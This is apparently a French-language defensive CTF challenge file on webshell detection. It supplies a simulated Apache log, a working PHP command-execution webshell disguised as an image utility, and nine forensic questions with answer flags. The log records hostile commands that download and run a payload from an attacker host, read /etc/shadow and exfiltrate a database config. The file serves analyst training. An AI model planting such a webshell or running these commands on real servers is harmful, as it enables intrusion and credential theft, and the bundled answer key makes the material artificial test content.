"""
Challenge 4 — Détection de Webshell
Niveau : 2 (Analyste Confirmé)
Catégorie : Analyse de Logs
"""

ARTIFACT_ACCESS_LOG = r"""10.0.1.50 - deploy [18/Feb/2026:06:00:01 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0"
10.0.1.50 - deploy [18/Feb/2026:06:00:02 +0100] "GET /css/style.css HTTP/1.1" 200 8923 "https://www.redpawn-corp.com/" "Mozilla/5.0"
10.0.1.50 - deploy [18/Feb/2026:06:00:03 +0100] "GET /js/app.js HTTP/1.1" 200 12456 "https://www.redpawn-corp.com/" "Mozilla/5.0"
93.184.216.34 - - [18/Feb/2026:07:15:22 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
93.184.216.34 - - [18/Feb/2026:07:15:30 +0100] "GET /contact.php HTTP/1.1" 200 8432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
93.184.216.34 - - [18/Feb/2026:07:16:01 +0100] "POST /contact.php HTTP/1.1" 200 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
185.234.72.19 - - [18/Feb/2026:08:30:15 +0100] "GET / HTTP/1.1" 200 15234 "-" "Mozlila/5.0 (Linux; Android 7.0) Chrome/59.0.3071.125"
185.234.72.19 - - [18/Feb/2026:08:30:17 +0100] "GET /wp-login.php HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:18 +0100] "GET /admin/ HTTP/1.1" 403 567 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:19 +0100] "GET /administrator/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:20 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 1234 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:30:25 +0100] "GET /uploads/ HTTP/1.1" 200 3456 "-" "Mozlila/5.0"
185.234.72.19 - - [18/Feb/2026:08:31:02 +0100] "POST /upload.php HTTP/1.1" 200 89 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:05 +0100] "GET /uploads/logo-update.php HTTP/1.1" 200 45 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:10 +0100] "POST /uploads/logo-update.php HTTP/1.1" 200 1289 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:15 +0100] "POST /uploads/logo-update.php?cmd=id HTTP/1.1" 200 56 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:20 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2345 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:30 +0100] "POST /uploads/logo-update.php?cmd=uname+-a HTTP/1.1" 200 189 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:45 +0100] "POST /uploads/logo-update.php?cmd=wget+http://185.234.72.19:8080/shell.elf+-O+/tmp/.update HTTP/1.1" 200 23 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:50 +0100] "POST /uploads/logo-update.php?cmd=chmod+%2Bx+/tmp/.update HTTP/1.1" 200 12 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:31:55 +0100] "POST /uploads/logo-update.php?cmd=/tmp/.update HTTP/1.1" 200 34 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:35:00 +0100] "POST /uploads/logo-update.php?cmd=cat+/etc/shadow HTTP/1.1" 200 1456 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:36:00 +0100] "POST /uploads/logo-update.php?cmd=find+/+-name+"*.conf"+-type+f HTTP/1.1" 200 5678 "-" "python-requests/2.28.1"
185.234.72.19 - - [18/Feb/2026:08:37:00 +0100] "POST /uploads/logo-update.php?cmd=cat+/var/www/config/database.php HTTP/1.1" 200 234 "-" "python-requests/2.28.1"
10.0.1.50 - deploy [18/Feb/2026:09:00:01 +0100] "GET /index.php HTTP/1.1" 200 15234 "-" "Mozilla/5.0"
"""

ARTIFACT_WEBSHELL = r"""<?php
// logo-update.php — "Image processing utility"
// Last modified: 2026-02-18

@error_reporting(0);
@set_time_limit(0);

if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    if(function_exists('system')){
        @system($cmd . ' 2>&1', $ret);
    } elseif(function_exists('passthru')){
        @passthru($cmd . ' 2>&1', $ret);
    } elseif(function_exists('exec')){
        @exec($cmd . ' 2>&1', $output, $ret);
        echo implode("\n", $output);
    } elseif(function_exists('shell_exec')){
        echo @shell_exec($cmd . ' 2>&1');
    }
} else {
    echo "OK";
}
?>
"""

CHALLENGE = {
    "id": "c04_webshell",
    "title": "🕷️ Le Faux Logo",
    "category": "log_analysis",
    "level": 2,
    "points_total": 350,
    "estimated_time": "30-45 min",
    "story": """
## 📋 Briefing de Mission

**Date :** 18 février 2026, 14h00  
**Priorité :** CRITIQUE  
**Source :** Alerte IDS — Snort rule `WEB-PHP Command Injection`

---

L'IDS a déclenché une alerte sur le serveur web **srv-web-01**. Des requêtes HTTP suspectes contenant des commandes système ont été détectées.

L'équipe N1 vous escalade le cas :

> *"L'IDS remonte des alertes de command injection sur le site web. On pense qu'il y a un webshell. J'ai besoin que tu analyses les logs Apache et que tu reconstitues tout ce que l'attaquant a fait. C'est urgent, le serveur est en production."*

Vous avez accès aux logs Apache et au fichier suspect trouvé sur le serveur.
    """,
    "artifacts": [
        {
            "name": "access.log",
            "type": "log",
            "content": ARTIFACT_ACCESS_LOG,
            "description": "Extrait du fichier access.log Apache de srv-web-01"
        },
        {
            "name": "logo-update.php",
            "type": "code",
            "content": ARTIFACT_WEBSHELL,
            "description": "Fichier suspect trouvé dans /var/www/html/uploads/"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Quel est le mot mal orthographié dans le User-Agent suspect utilisé lors du scan initial ?",
            "answer": "Mozlila",
            "flag": "REDPAWN{Mozlila}",
            "points": 40,
            "hints": [
                "Comparez les User-Agents de l'attaquant avec 'Mozilla'",
                "Il y a une erreur volontaire dans l'orthographe de Mozilla"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Par quel endpoint l'attaquant a-t-il uploadé le webshell ? (chemin complet)",
            "answer": "/upload.php",
            "flag": "REDPAWN{/upload.php}",
            "points": 40,
            "hints": [
                "Cherchez la première requête POST avec python-requests",
                "C'est la page d'upload du site"
            ],
            "hint_cost": 13
        },
        {
            "id": "q3",
            "text": "Quel est le nom complet du fichier webshell déposé ?",
            "answer": "logo-update.php",
            "flag": "REDPAWN{logo-update.php}",
            "points": 30,
            "hints": [
                "Regardez le fichier accédé dans /uploads/ juste après l'upload",
                "Le nom fait semblant d'être un utilitaire d'image"
            ],
            "hint_cost": 10
        },
        {
            "id": "q4",
            "text": "Quel outil/bibliothèque l'attaquant utilise-t-il pour interagir avec le webshell ?",
            "answer": "python-requests/2.28.1",
            "flag": "REDPAWN{python-requests}",
            "points": 30,
            "hints": [
                "Regardez le User-Agent lors de l'exploitation du webshell",
                "C'est une bibliothèque Python"
            ],
            "hint_cost": 10
        },
        {
            "id": "q5",
            "text": "Quel est le chemin complet du reverse shell téléchargé par l'attaquant sur le serveur ?",
            "answer": "/tmp/.update",
            "flag": "REDPAWN{/tmp/.update}",
            "points": 50,
            "hints": [
                "Cherchez une commande wget dans les requêtes",
                "Le fichier est caché (commence par un point) dans /tmp"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "L'attaquant a lu un fichier critique contenant les mots de passe hashés. Quel fichier ? (chemin complet)",
            "answer": "/etc/shadow",
            "flag": "REDPAWN{/etc/shadow}",
            "points": 40,
            "hints": [
                "Cherchez la commande 'cat' sur un fichier sensible du système",
                "Ce fichier contient les hashes des mots de passe sous Linux"
            ],
            "hint_cost": 13
        },
        {
            "id": "q7",
            "text": "Quel fichier de configuration l'attaquant a-t-il exfiltré en dernier ? (chemin complet)",
            "answer": "/var/www/config/database.php",
            "flag": "REDPAWN{/var/www/config/database.php}",
            "points": 40,
            "hints": [
                "Regardez la dernière commande cmd=cat de l'attaquant",
                "C'est un fichier de configuration de base de données"
            ],
            "hint_cost": 13
        },
        {
            "id": "q8",
            "text": "Dans le code du webshell, quelle est la première fonction PHP tentée pour exécuter des commandes ?",
            "answer": "system",
            "flag": "REDPAWN{system}",
            "points": 30,
            "hints": [
                "Lisez le code PHP du webshell",
                "Il y a une cascade de if/elseif avec différentes fonctions"
            ],
            "hint_cost": 10
        },
        {
            "id": "q9",
            "text": "Depuis quel serveur l'attaquant télécharge-t-il le reverse shell ?",
            "answer": "185.234.72.19:8080",
            "flag": "REDPAWN{185.234.72.19:8080}",
            "points": 50,
            "hints": [
                "Regardez la commande wget",
                "Le format est IP:port"
            ],
            "hint_cost": 17
        }
    ]
}
